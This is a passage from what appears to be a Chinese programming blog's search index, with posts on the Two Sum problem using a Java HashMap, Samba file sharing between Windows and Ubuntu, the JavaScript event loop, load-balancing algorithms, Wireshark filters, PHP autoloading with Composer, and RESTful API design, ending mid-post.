HashMap储备知识 Map 顾名思义， Map 是一种映射，就像是数学中的函数映射一样。 $ y = f(x) $ 中，对于作用域内任意的 x 都有为一与之对应的值 y。 同理，在 Map 中，任意的 key 和 value 都有一一对应的关系。 Java 中，Map 是一个抽象接口，提供了常用的方法： 功能 方法 备注 判断某个 key 是否存在 map 中 boolean map.containsKey(key) map.get(key) == null 也可以 向 map 中插入元素 object map.put(key, value) 根据 key 在 map 获取元素 object map.get(key) 如果key不存在，则返回 null 判断 map 是否为空 map.size() == 0 或者 isEmpty() size() 返回键值对映射数量 泛型 泛型程序设计（generic programming）是程序设计语言的一种风格或范式。泛型允许程序员在强类型程序设计语言中编写代码时使用一些以后才指定的类型，在实例化时作为参数指明这些类型。 ——维基百科 意思就是在程序设计时使用一种通用的数据类型，在实例化的时候再指定具体的类型，如下： 123public void generic(&lt;T&gt; T) &#123; // code here ...&#125; Solution 根据 HashMap 的特点，我们可以将数组中的每个元素作为 key，数组元素的索引位置作为 value 构建一个 HashMap，然后遍历数组，遍历到第 i 个元素时，如果存在另一个元素与第 i 个元素之和等于 target，则 让 key = target - nums[i] , hashmap.containsKey(key) 返回 true 按照如上想法，代码如下： 12345678910111213141516171819class Solution &#123; public int[] twoSum(int[] nums, int target) &#123; HashMap&lt;Integer, Integer&gt; container = new HashMap&lt;&gt;(); // initialize container for (int i = 0; i &lt; nums.length; i++) &#123; container.put(nums[i], i); &#125; for (int i = 0; i &lt; nums.length; i++) &#123; int key = target - nums[i]; if (container.containsKey(key)) &#123; return new int[]&#123;i, container.get(key)&#125;; &#125; &#125; return null; &#125;&#125; 然后运行第一个测试用例： 12[2,7,11,15]9 需要注意的是由于 HashMap 的 key 不允许重复，也就是说相同的 key 会被覆盖掉，试想如下测试用例： 12[2,2,2,2,3,4]4 这个测试用例返回的结果是 [0, 3] ，这是因为 hashmap 中 key 为 2 的 hash 值被多次修改，最终为 3。 但是一个元素只能使用一次，试想如果 target - nums[i] 的值正好等于 nums[i] 的值会是怎样？ 12[2, 1, 3]4 以上测试用例输出 [0, 0]，而正确答案应该是 [1, 2]。为了去重复，正确的判断条件应该是， 让 key = target - nums[i]，满足： hashmap.containsKey(key) 返回 true 且 hashmap.get(key) != i 改进后的代码如下： 1234567891011121314151617181920class Solution &#123; public int[] twoSum(int[] nums, int target) &#123; HashMap&lt;Integer, Integer&gt; container = new HashMap&lt;&gt;(); // initialize container for (int i = 0; i &lt; nums.length; i++) &#123; container.put(nums[i], i); &#125; for (int i = 0; i &lt; nums.length; i++) &#123; int key = target - nums[i]; Integer value = container.get(key); if (null != value &amp;&amp; value != i) &#123; return new int[]&#123;i, value&#125;; &#125; &#125; return null; &#125;&#125; 提交后，运行时 2s，打败 98.84% 解释： Integer value = container.get(key); 这行代码中必须使用 Integer 类型，因为 HashMap 中不存在 key 时 get(key) 返回 null，null 代表空指针引用。 null != value &amp;&amp; value != i ，此处 value 是 Integer 类型的 Object，因此与 null 可以进行比较运算，Integer 是基本类型 int 的包装器类型，在与 int 类型的 i 进行比较运算时，自动转换为 int 类型。 参考 大神的骚操作-Solution)]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows 10 配合 Ubuntu 搭建舒适开发环境不完全指北]]></title>
    <url>%2Fexperience%2Fguide%2Fdev-environment-on-windows-and-linux%2F</url>
    <content type="text"><![CDATA[零、背景Mac Book Pro （MBP）一直是极客开发者首选的操作系统，然而在工作中，并不是每个公司都会为开发者配备 MBP 的，然而，相信有强迫症的程序员都无法忍受 Windows 的命令行工具，我也不例外。好再微软在 2019 年 5 月推出了一款 Windows Terminal（截至作者撰稿时，仅 Preview 版可用），可以说给基于 Window 开发的程序员带来了福音。 然而不幸的是，Windows Terminal 只能在 Windows 10 的某些高版本中使用，而作者所在公司仅支持 Windows 7 系统，好在同事申请了一台 MBP 后我把他原来的 Windows 机借过来了，所以作者就拥有了两台开发机器。基于以上背景，本文记录了使用 Window 配合 Linux 搭建舒畅的开发环境的过程。操作系统配置信息如下： OS Version CPU core Memory Disk Windows 10 1809 4 16G 512G(SSD) Ubuntu 18.04 4 16G 512G 由于 Linux 机器无法接入公司的域，同时很多办公软件在 Linux 下没有简单的替代品，最终选择 Windows + Ubuntu 的解决方案： Windows — 办公，负责邮件，文档，多媒体的处理。 Linux — 开发，负责部署开发环境 两台主机协同办公，难免会存在如下问题： Linux 机器无法接入办公网，导致代码不能正常部署/下载 Windows 和 Linux 之间难免有文件传输 多鼠标/键盘且换带来困扰 只需要解决如上三个问题，两台电脑开发几乎游刃有余，经过摸索以及实践，最终采用如下方案解决如上三个问题， Windows 机器接入公司域，然后开启热点，供 Linux 使用，以保证两台电脑在一个局域网内 Linux 机器上安装 Samba 服务，将目录共享到 Windows 机器上，方便文件传输 使用 Synergy 实现键鼠共享，一套键鼠共同控制两台主机 本文后续即为以上解决方案的绝体实现，仅供你参考，如有疑惑可以自行 Google 或者通过邮件与我交流。 一、搭建 Samba 服务1.1 Linux 安装 Samba 服务Samba service Installation 1&gt; sudo apt-get install -y samba samba-common 创建共享目录 1&gt; cd ~ &amp;&amp; mkdir share 添加账号1&gt; sudo smbpasswd -a gbin # gbin 账号必须是系统中存在的账号，如果系统中不存在则先 useradd 添加账号 修改配置 1&gt; sudo vim /etc/samba/smb.conf 末尾添加如下内容： 123456789101112[share] comment = share from ubuntu browseable = yes path = /home/gbin/share create mask = 0700 directory mask = 0700 valid users = gbin force user = gbin force group = gbin public = yes available = yes writable = yes 重启 smbd 服务 1&gt; sudo service smbd restart 1.2 Windows 接入共享文件夹打开资源管理器，输入 \your-ip\your-shared-folder，在弹出的对话框中输入账号密码。输入完成后，即可在 Windows 上开发项目，对项目的更改会实时同步到 Linux 中，修改完成后可直接在 Linux 中编译运行，Web 等项目则可以直接在 Window 中通过浏览器远程访问项目。 [Optional]: 将共享目录映射成一个 Drive打开资源管理器 -&gt; Network -&gt; Map Network Drive: 1.3 [Optional] troubleshootingWindow 无法连接共享文件夹Window 尝试连接共享文件夹时，报如下错误：1You Can’t Access This Share Folder Because Your Organisation’s Security Policies Block Unauthenticated Guest Access. ssh 登录 ubuntu，使用 smbclient 检查 samba 服务的可用性 12&gt; sudo apt-get install -y smbclient&gt; smbclient -L \\localhost -U username%your-password 输出如下： 123456789101112131415WARNING: The "syslog" option is deprecated Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers share Disk share from ubuntu IPC$ IPC IPC Service (gbin-dev server (Samba, Ubuntu))Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP GBIN-DEV 其中看到 share from ubuntu 的注释代表 smb 服务启动成功 修改 windows 的配置按照这个教程 开启 insecure guest logons 选项 二、键鼠共享其他方案Windows + WSL + Window Terminal最近，微软发布了 Windows Terminal 的 preview 版本，该方案也是值得尝尝新，但是要求 Window 10 的系统版本要 &gt;=1903，因为公司电脑统一升级，我尝试自己升级两次后都失败了，所以放弃了该方案，感兴趣的同学可以自己尝试尝试。 Windows + Virtual Machine这种方案是使用诸如 VMware Workstation (Player || pro)、Hyper-V、VirtualBox 之类的虚拟机管理软件安装 Linux 虚拟机，然后虚拟机和主机之间通过某些方案(虚拟机的文件夹共享或者 samba 服务)进行文件共享，最后在 Windows 上进行开发，在 VM 上完成编译。 在没有远程 Linux 的情况下可以考虑使用这种方案，但是可能会遇到如下问题： 网络问题 虚拟机提供多种网络环境，如果要接入外网的话一般会选 Bridge 和 NAT 这两种方案之一。但是，一般来讲公司的内网 IP 会受限制，无法使用 Bridge，而使用 NAT 网络时，VM Player 对端口转发支持并不是很好(Pro 版要收费)。总的来讲，一是折腾起来很麻烦， 二十使用虚拟机本身就很耗费资源，显得臃肿，与极客开发者的性格不相符合。 文件夹共享问题 使用虚拟机管理软件提供的文件夹共享可以把 Windows 宿主机下的文件夹挂在到 Linux 中，但是这种方式在共享文件夹中使用 npm 会有一些坑，与 symlink 相关，详情可以参考这里 除了使用虚拟机管理软件提供的文件夹共享方式以外，还可以用 samba 服务把虚拟机里的目录共享到宿主机上，这样可以很方便的在 Windows 上开发，在 Linux 中完成编译运行。]]></content>
      <categories>
        <category>Experience</category>
        <category>Guide</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 执行机制（不完全指北）]]></title>
    <url>%2Ffundamental%2Fprogramming-language%2Fjavascript%2Ffrontend-javascript-execution-procession%2F</url>
    <content type="text"><![CDATA[前言本文试图讲解 JavaScript 的执行机制，理解事件循环，读完这篇文章，本文围绕以下两个问题讲解： 为什么 JavaScript 是单线程和异步？ JavaScript 如何实现异步？ 知识储备 进程、线程 进程阻塞 阻塞 IO 和非阻塞 IO 同步IO与异步IO JavaScript 的特点 单线程 JavaScript 的核心之一是 DOM 对象，在 jQuery 时代 DOM 是 JavaScript 的直接操作单元，试想如果是多线程操作 DOM 会是怎样？如下场景： 场景描述:DOM 对象中含有一个 a 节点，如果 process1 对 a 节点进行删除操作, 而 process2 对 a 节点进行编辑操作，那么浏览器该如何保证 JavaScript 有条不紊的执行？ 多线程的读写操作中，通常是通过加锁保证资源的一致性（状态同步），可是控制如此复杂的 DOM 结构岂是简单的加锁就能解决？因此，JavaScript 就索性使用单线程机制。 单线程的最大好处是不用像多线程编程那样处处在意状态的同步问题，这里没有死锁的存在，也没有线程上下文交换所带来的性能上的开销。 异步基于单线程条件下如果采取同步等待执行任务，那么那些复杂的 DOM 操作以及受外界影响的 IO 操作会导致执行阻塞，用户会感觉到页面很卡顿，从而导致用户体验很差，所以 JavaScript 执行引擎采取了单线程异步执方案。 单线程异步实现原理综上述，我们已经知道， JavaScript 的两大特点就是单线程、异步，那么如何在单线程中实现异步呢？这就是本文的重点。However, 如果所有的操作（包括IO/定时器/文件读写）都在只有一个线程来完成，那么就算实现完美的异步（CPU 100%利用，没有空闲）也将很慢。所以 JavaScript 所谓的单线程是指 JavaScript 的解释引擎中执行 JavaScript 代码的线程只有一个，称作主线程,除此之外，还存在一些负责 AJAX 请求、定时器、IO 操作的线程，这些线程称作工作线程。 任务分类严格来讲，执行引擎将 JavaScript 代码分为两类，宏任务和微任务： macro-task(宏任务)：包括整体代码（script 标签），定时器（setTimeout、setInterval） micro-task(微任务)：Promise，process.nextTick 事件循环主线程执行，遇到异步任务时，有工作线程执行异步任务，并在主线程中注册回调函数 (图片来自《深入浅出Node.js》) 在 JavaScript 执行之前，会先将任务放入宏任务队列和微任务队列中。一次 JavaScript 执行按照如下流程进行，宏任务作为 JavaScript 的执行单位开始执行，宏任务执行结束检查是否有可执行的微任务，如果有则执行所有的微任务，如果没有则结束本次执行。 这只是一次 JavaScript 的执行片段，所有微任务执行完毕后（如果有）JavaScript 引擎会重复以上步骤，直到所有的代码都执行完，这个过程就是事件循环（Eventloop)。 案例分析12345678910111213141516171819202122232425262728293031323334353637383940414243444546// 开始事件循环// 同步宏任务console.log('1');// 异步宏任务 setTimeOut1setTimeout(function() &#123; // 进入宏任务异步队列 2 console.log('2'); // 遇到微任务,进入微任务异步队列 3 process.nextTick(function() &#123; console.log('3'); &#125;) // 遇到微任务,进入微任务异步队列 3 4 5 new Promise(function(resolve) &#123; console.log('4'); resolve(); &#125;).then(function() &#123; console.log('5') &#125;)&#125;)// 异步微任务 nextTickprocess.nextTick(function() &#123; console.log('6');&#125;)// 异步微任务 Promise1new Promise(function(resolve) &#123; console.log('7'); resolve();&#125;).then(function() &#123; console.log('8')&#125;)// 异步宏任务 setTimeOut1 setTimeout2setTimeout(function() &#123; console.log('9'); process.nextTick(function() &#123; console.log('10'); &#125;) new Promise(function(resolve) &#123; console.log('11'); resolve(); &#125;).then(function() &#123; console.log('12') &#125;)&#125;) 主线程执行同步任务(形成一个执行栈)输出 1 , setTimeout1 进入异步宏过任务队列,process1 进入异步微任务队列,遇到 new Promise 输出 7, then 进入异步微任务队列setTimeOut2 进入宏任务队列, 处理微任务队列 process1 和 promise1.then 输出 6,8 开始第三次事件循环处理setTimeout1 ,主线程输出 2 , 4 然后处理异步微任务输出 3,5 开始第四次事件循环处理 setTimeout2 ,主线程输出 9, 11 然后处理异步微任务输出 10, 12 参考 10分钟理解JS引擎的执行机制 这一次，彻底弄懂 JavaScript 执行机制s=>start: 开始 macro=>operation: 宏任务 execMacro=>operation: 宏任务执行结束 cond=>condition: 是否有可执行的微任务 execMicro=>operation: 执行所微任务 e=>end: 结束 s->macro->execMacro->cond cond(yes)->execMicro->e cond(no)->e{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12} var code = document.getElementById("flowchart-0-code").value; var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value)); var diagram = flowchart.parse(code); diagram.drawSVG("flowchart-0", options);s=>start: 开始 macro=>operation: 宏任务队列 execMacro=>operation: 执行一个宏任务 cond=>condition: 是否有可执行的微任务 execMicro=>operation: 执行所微任务 e=>end: 结束 s->macro(bottom)->execMacro(right)->cond cond(yes)(left)->execMicro(left)->macro cond(no)->macro{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12} var code = document.getElementById("flowchart-1-code").value; var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-1-options").value)); var diagram = flowchart.parse(code); diagram.drawSVG("flowchart-1", options);]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Eventloop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用负载均衡算法]]></title>
    <url>%2Fexperience%2Fpractice%2Fdev-load-balancing%2F</url>
    <content type="text"><![CDATA[背景项目开发时，调用第三方服务集群，集群有多台机器，当机器之间没有主从之分时，需要应用层自己做负载均衡以保证各机器之间的流量均衡。 负载调度算法介绍分布式系统中，常用负载调度算法有轮询、加权轮询、哈希、随机、加权随机、最小连接数。 轮询法 将请求按顺序轮流地分配到后端服务器上，它均衡地对待后端的每一台服务器，而不关心服务器实际的连接数和当前的系统负载。 随机法 系统的随机算法，根据后端服务器的列表大小值来随机选取其中的一台服务器进行访问。 源地址哈希法 通过客户端 IP 和服务端 IP 生成唯一的 Hash key。 4、加权轮询法 不同机器的配置不同，因此所能承受的负载也不同，因此根据机器的性能分配负载权重也不同。 5、加权随机法 和加权轮询类似，后续详解。 6、最小连接数法 ​ 最小连接数算法比较灵活和智能，由于后端服务器的配置不尽相同，对于请求的处理有快有慢，它是根据后端服务器当前的连接情况，动态地选取其中当前 积压连接数最少的一台服务器来处理当前的请求，尽可能地提高后端服务的利用效率，将负责合理地分流到每一台服务器。 轮询法、随机法和源地址哈希都是比较简单的，本文重点展开加权轮询、加权随机和最小连接数法。 加权轮询Nginx 的负载均衡配置中，支持加权轮询，其配置如下： 12345upstream tomcats &#123; server 192.168.0.100:8080 weight=2; # 2/6次 server 192.168.0.101:8080 weight=3; # 3/6次 server 192.168.0.102:8080 weight=1; # 1/6次&#125; 通常的轮询算法在执行第 $i$ 次请求时，通过 $k = (i + 1) % n $ 选举出第$k$台机器，算法简洁、无需记录所有连接状态，是一种很常用的负责均衡算法。其缺点也很明显，就是不能分配各机器的权重，假设有 $n$ 台机器如果宕机 1 台就会导致命中率下降为$1/n$，为此加权轮询算法应运而生。 加权轮询 WRR(weighted round-robin)算法分为普通加权轮询和平滑加权轮询。加权轮询核心是将一组机器按照权重扩充得到一个序列，然后和普通的轮询算法一样取模求得当前请求应该访问的机器。比如权重为{a:5, b:1, c:1}的一组服务器，加权轮询算法的扩充序列为{ c, b, a, a, a, a, a }，然而这样的序列导致机器 a 集中分布，会造成某部分服务器集群压力过大。平滑加权轮询算法就是将扩充序列随机打散以保证序列的随机性，如权重为{a:5, b:1, c:1} 的机器的平滑扩充序列可能是 { a, a, b, a, c, a, a }。 加权随机从不重复的含有 n 个元素中不放回随机选取 m 个元素，如果每个元素被选中的概览都相等则把这个过程叫随机抽样（RS——Random Sampling）。加权随机抽样(WRS——Weighted Random Sampling)是指每个元素都带有一个权重，权重决定了该元素被选中的概览。 Pavlos S. Efraimidis 等人在论文Weighted Random Sampling中提出了一种 WRS 算法A，以及基于算法 A 的变种 A-Res 和 A-ExpJ。 A 算法 对于集合 $V$ 中的元素 $v_i \in V$，选取均匀分布的随机数 $u_i=rand(0,1)$ ，计算元素的特征 $k_i = u_i^{(1/w_i)}$ 将集合按 $k_i$ 排序，选取前 $m$ 大的元素。 算法的核心是元素特征 $k_i$ 的计算，其正确性在 Weighted random sampling with a reservoir给出了详细的证明。 A-Res—— 基于 A 算法的改进算法A-Res(Algorithm A with Reservoir) 是 A 算法的”蓄水池“版本，假设从 $n$ 个元素的集合$V$中按权重选取 $m$ 个元素，该算法维护了 $m$ 个元素的集合 $S$，遍历集合$V$中的元素，计算特征值$k_i = u_i^{(1/w_i)}$，当当前元素的特征值大于集合$S$中的特征值时，用当前元素替换集合$S$中特征值最小的元素。具体步骤如下： 将集合 $V$ 的前 $m$ 个元素放入结果集合 $S$。 计算集合$S$中每个元素的特征值 $k_i = u_i^{(1/w_i)}$，其中 $u_i = rand(0,1)$ 对于$v_i \in {m+1, m+2,….,n}$ 重复如下步骤 4 ~ 6 将结果集中最小的特征 $k_{min}$作为当前的阈值 $T$ 对于元素 $v_i$，计算其特征值$k_i = u_i^{(1/w_i)}$ 如果 $k_i &gt; T$ 则使用当前元素$V_i$替换集合$S$中特征值最小的元素(T 所对应的元素)。 如上步骤，该算法只需对集合 $V$ 遍历一次，且并不需事先知道该集合的长度 $m$，因此该算法非常适合数据流场景。论文证明了该算法插入$S$的次数为$O(m \log(\frac{n}{m}))$。该算法实现也不难，核心是维护一个最小堆。 最小连接数法在实际生产中，客户端的每一次请求并非是相同的请求，服务端处理的时间也不相同，因此无论使用源地址哈希还是随机亦或是轮询都只是即用户请求数量层面的负载均衡。最小连接数法是记录了各服务器的当前连接数量，新请求来时将请求分配到当前连接数最少的服务器。其他负载均衡算法中，当宕机时失败率会瞬间增加，需要手动将机器摘除或将该机器的权重置为0 ，而最小连接法是一种动态调度算法，当发生宕机时，甚至可以实现自动切流量，提高成功率。 参考资料 https://colobu.com/2016/12/04/smooth-weighted-round-robin-algorithm/ https://utopia.duth.gr/~pefraimi/research/data/2007EncOfAlg.pdf https://lotabout.me/2018/Weighted-Random-Sampling/ http://security.ctocio.com.cn/securitycomment/412/8082412.shtml]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Balancing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wireshark 使用说明]]></title>
    <url>%2Ffundamental%2Fnetwork%2Fnetwork-introduction-of-wireshark%2F</url>
    <content type="text"><![CDATA[通俗来讲，Wireshark 是一个免费的抓包工具（分组嗅探器），它可以显示协议栈不同层级封装的消息内容，Wireshark 有盘大的用户群体，它可在Windows，Mac和Linux / Unix计算机上运行。 1. 安装 Ubuntu 下 1&gt; sudo apt-get install wireshark Windows 前往官网中下载相应安装包即可。 2. 基本界面Ubuntu 环境下，命令行中使用管理员权限启动 Wiresharksudo wireshark-gkt， 启动界面如图 点击 Interface List 查看当前活动的网卡接口，选中某个接口后点击 start 开始抓包。抓包时， Wireshark 分为五大部分 菜单栏和工具栏 菜单栏提供抓包设置、数据筛选、数据统计、帮助等丰富的功能 工具栏中包括快捷打开接口列表、抓包设置、开始抓包、停止抓包、包文件管理以及一些其他快捷操作，鼠标长放到工具按钮上会显示按钮的作用。 规则过滤器 规则过滤器用来过滤请求列表，相关规则介绍请见下文。 数据包列表 数据包列表实际是通信请求列表，展示了每个请求的的概览信息，包括请求时间、源地址和目标地址、协议、长度等信息。 数据包封装内容详情 在请求列表中选中某个具体的请求后，该区域分层展示没一层的数据包，最上层是帧（Frame)，依次往下是链路层、网络层（IP）、传输层（TCP），然后是应用层协议，应用层协议可以有一个或多个。 数据包16进制 ASCII 码表示 此处显示传输信息的 16 进制 ASCII 编码。 3. 过滤规则启动 Wireshark 后，通过规则过滤器可以过滤请求列表，在规则过滤器中数据过滤规则时，如果语法有误，框会显红色，如正确，会是绿色，输入正确的规则后点击Apply 生效。其中过滤规则包括 过滤IP 12ip eq 192.168.191.2 # 不管源 IP 还是目标 IPip.src eq 192.168.191.2 # 限制源 IP 过滤端口 12tcp.port eq 80 # 限制端口为 80tcp.srcport eq 80 # 限制源端口 过滤协议 12345678910111213tcpudparpicmphttpsmtpftpdnsmsnmsipssloicqbootp 过滤MAC地址 12eth.dst == A0:00:00:04:C5:84 // 过滤目标maceth.src eq A0:00:00:04:C5:84 // 过滤来源mac HTTP模式过滤 12345http.request.method == “GET”http.request.method == “POST”http.request.uri == “/public/images/test.png”http contains “GET”http contains “HTTP/1.” 以上基本过滤规则基本已经满足了日常的抓包需求，Wireshark 的过滤规则很庞大，如果想详细了解请参考官方文档。]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
        <tag>Network</tag>
        <tag>TCP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP 自动加载和 Composer]]></title>
    <url>%2Ffundamental%2Fprogramming-language%2Fphp%2Fphp-autoload-and-composer%2F</url>
    <content type="text"><![CDATA[和 C/C++ 中的#include一样，PHP 提供 require 和 include 等方法允许将一个外部 PHP 文件引入到当前文件中，include与require没有本质上的区别，唯一的不同在于错误级别，当文件无法被正常加载时include会抛出warning警告，而require则会抛出error错误。 在大型的项目开发中，文件之间的错综复杂的引用关系很容易导致一个文件被多次引入，虽然 PHP 提供了 require_once 和 include_once 避免文件的重复引入，require_once 和 include_once 会将引入过的文件保存在EG(included_files)哈希表中，再次加载时检查这个哈希表，如果发现已经加载过则直接跳过，随着引入文件的增多，维护哈希表的代价会增大，因此 PHP 5 引入了自动加载（autoloat）机制，这种机制会在文件被需要的时候引入近来，这种文件包含方式也称作懒加载（lazy loading），在前端的 NPM 包加载中也被广泛使用。 __autoload()PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法，这类方法往往是在触发某个异常之前被执行。 如在调用不存在的方法是__call()方法会被自动调用， 1234567891011121314&lt;?phpclass TestCall&#123; public function __call($name, $arguments) &#123; // TODO throw exception echo 'function '.$name.' not exist!'; &#125;&#125;$test = new TestCall();$test-&gt;sayHello(); // function sayHello not exist! 类似的，PHP 提供了 魔术方法 __autoload()， 当使用一个未定义的类时，以该方法被自动调用，类名作为参数，我们可以在发生异常之前的最后一刻去尝试引入这个类，这就是自动加载的原理，如下代码： 1234function __autoload($className)&#123; // 自定义加载规则，包括类名称，类存储位置等 require_once($className.'class.php');&#125; 值得注意的是，如果要实现自动加载必须能根据类名确定文件位置和文件名。 autoload 缺点： 类名与文件名的所有逻辑映射规则都要在一个函数中实现从而使得自动加载规则相当不灵活，代码也变得很臃肿 __spl_autoload_register() 为了改进这一问题，PHP 推出了 spl_autoload_register() ，用于注册给定的函数作为 __autoload 的实现，从而实现类名与文件名之间可以有多套逻辑映射规则，不同的映射规则分别调用一个 __autoload 函数即可，比如规则自动加载文件分别存在 A 目录和 B 目录下，使用 spl_autoload_register() 可以注册两个自动加载函数，分别将 A和B目录下的以类名同名的文件引入进来。 1234567891011function ruleA($class) &#123; $file = 'A/'.$class . '.php'; require_once $file;&#125;function ruleB($class) &#123; $file = 'B/'.$class . '.php'; require_once $file;&#125;spl_autoload_register("ruleA");spl_autoload_register("ruleB");$text = new test(); // test 不存在，自动加载器会尝试引入 A/test.php 和 B/test.php 和 spl_autoload_register() 一起推出的还有很多函数，这些函数可以很灵活的管理自动加载， spl_autoload_register：注册 _autoload() 函数 spl_autoload_unregister：注销已注册的函数 spl_autoload_functions：返回所有已注册的函数 spl_autoload_call：尝试所有已注册的函数来加载类 spl_autoload ：_autoload() 的默认实现 spl_autoload_extionsions： 注册并返回 spl_autoload 函数使用的默认文件扩展名。 ComposerComposer 是 PHP 包管理工具，其作用和 JavaScript 中的 NPM 相当，其基本使用参考文档。每个 Composer 包都有一个 composer.json 的配置文件，想要创建一个包只需在包的根路径下执行命令composer init。composer.json 中 autoload 字段提供配置自动加载方式，包括如下四种 classmappsr-0psr-4files classmap 这应该是最最简单的 autoload 模式了。大概的意思就是这样的： 123&#123; &quot;classmap&quot;: [&quot;src/&quot;]&#125; 然后 composer 在背后就会读取这个文件夹中所有的文件 然后再 vendor/composer/autoload_classmap.php 中怒将所有的 class 的 namespace + classname 生成成一个 key =&gt; value 的 php 数组 12345&lt;?phpreturn [ &apos;App\\Console\\Kernel&apos; =&gt; $baseDir . &apos;/app/Console/Kernel.php&apos;];?&gt; 然后就可以光明正大地用 spl_autoload_register 这个函数来怒做自动加载了。 好吧 上面的例子其实有点 tricky 就是上面这个 autoload 实际上是根据 prs-4 来生成出来的。不过这不重要，了解底层重要点，我们可以看到所有的所谓的 autoloading 其实可以理解为生成了这么一个 classmap，这是 composer dump-autoload -o 做的事儿。不然的话compoesr 会吭哧吭哧地去动态读取 psr-4 和 prs-0 的内容。 psr-0 现在这个标准已经过时了。当初制定这个标准的时候主要是在 php 从 5.2 刚刚跃迁到 5.3+ 有了命名空间的概念。所以这个时候 psr-0 的标准主要考虑到了 &lt;5.2 的 php 中 类似 Acme_Util_ClassName 这样的写法。 12345678&#123; &quot;name&quot;: &quot;acme/util&quot;, &quot;auto&quot; : &#123; &quot;psr-0&quot;: &#123; &quot;Acme\\Util\\&quot;: &quot;src/&quot; &#125; &#125;&#125; 文档结构是这样的 12345678vendor/ acme/ util/ composer.json src/ Acme/ Util/ ClassName.php ClassName.php 中是这样的 123&lt;?phpclass Acme_Util_ClassName&#123;&#125;?&gt; 我们可以看到由于旧版本的 php 没有 namespace 所以必须通过 _ 将类区分开。 这样稍微有点麻烦。指向一个文件夹之后 src 还要在 src 中分成好几层文档树。这样太深了。没有办法，但是似乎想要兼容 _ 的写法仔细想想这是唯一的办法了。（psr-0 要求 autoloading 的时候将 类中的 _ 转义为 ‘’） 所以在 php5.2 版本已经彻底被抛弃的今天， FIG 就怒推出了 psr-4 psr-4 这个标准出来的时候一片喷声，大概的意思就是 FIG 都是傻逼么，刚刚出了 psr-0 然后紧跟着进推翻了自己。不过 FIG 也有自己的苦衷，帮没有 namespace 支持的 php5.2 擦了那么久的屁股，在2014年10月21日的早晨，终于丢失了睡眠。 抛弃了 psr-0 的 composer 从此变得非常清爽。 最简单来讲就是可以把 prs-4 的 namespace 直接想想成 file structure 1234567891011121314&#123; &quot;name&quot;: &quot;acme/util&quot;, &quot;auto&quot; : &#123; &quot;psr-4&quot;: &#123; &quot;Acme\\Util\\&quot;: &quot;src/&quot; &#125; &#125;&#125;vendor/ acme/ util/ composer.json src/ ClassName.php 可以看到将 Acme\Util 指向了 src 之后 psr-4 就会默认所有的 src 下面的 class 都已经有了 Acme\Util 的 基本 namespace，而 psr-4 中不会将 _ 转义成 \ 所以就没有必要有 psr-0 那么深得文档结构了。 1234&lt;?phpnamespace Acme\Util;class ClassName &#123;&#125;?&gt; file 然而这还是不够。因为可能会有一些全局的 helper function 的存在。 这个写法很简单就不多看了。 12345&#123; &quot;files&quot;: [ &quot;path/to/file.php&quot; ]&#125; PHP 命名规范在过去的 2018 年里，笔者曾经介绍过PHP 命名空间，当时提到 PSR 要求，命名空间应与文件路径一致，比如 Laravel 默认生成的 app/Http/Controllers/Auth/LoginController.php，其命名空间为 App\Http\Controllers\Auth， PSR 的命名规范是给出了类名与文件名之间的一种映射，以便实现自动加载。 参考 https://laravelacademy.org/post/7074.html]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RESTful API 设计指导]]></title>
    <url>%2Fexperience%2Fpractice%2Fdev-restful-api-design%2F</url>
    <content type="text"><![CDATA[1. RESTful 简介REST (Representational State Transfer) 翻作「表层状态转换」，是 Roy Thomas Fielding 在他的博士论文中提出的一种 API 设计风格。 表现层状态转换是根基于超文本传输协议(HTTP)之上而确定的一组约束和属性，是一种设计提供万维网络服务的软件构建风格。匹配或兼容于这种架构风格(简称为 REST 或 RESTful)的网络服务，允许客户端发出以统一资源标识符访问和操作网络资源的请求，而与预先定义好的无状态操作集一致化。因此表现层状态转换提供了在互联网络的计算系统之间，彼此资源可交互使用的协作性质(interoperability)。 —— wikipedia 当今互联网无处不在，现实需求日益复杂，为适应这种复杂性，技术不断革新。传统的 B/S 架构中，前后端分离是大势所趋，而这种分离正式基于 API 模型，由于 RESTful 的诸多便利，越来越多的公司开始拥抱 RESTful，如 Github、Google 等都大量使用这种风格的 API，掌握 RESTful API 成为了一个后端程序员必备的基本技能。 2. API 设计RESTful API 是基于 HTTP 之上的一种设计风格，按照 HTTP 请求的基本组成将 RESTful API 分为如下几个模块： 2.1 协议为保证数据的传输安全，推荐使用 HTTPS 协议 2.2 域名与版本API 域名有两种形式可选择： 使用专属域名 api.example.com 主站域名+/api 形式, 如 example.com/api API 版本通常页有两种形式 域名 + v1/ 如 api.example.com/v1 版本信息放在 HTTP header 中，参见 GitHub 2.3 资源操作使用 HTTP 方法表示资源的操作 HTTP 方法 对应数据库操作 解释 GET SELECT 获取 URI 表示的资源（retrive），不产生副作用，对资源属性没有改变 POST INSERT 创建资源 PUT UPDATE 更新资源，客户端提供完整资源 PATCH UPDATE 更新资源的部分属性，客户端只提供更新的部分属性 DELETE DELETE 删除 URI 定位到的资源 2.4 资源路径——URL资源路径的设计是 RESTful API 的核心，资源是 HTTP 协议对数据的抽象，一个资源可简单理解为数据库中的一张表。URL 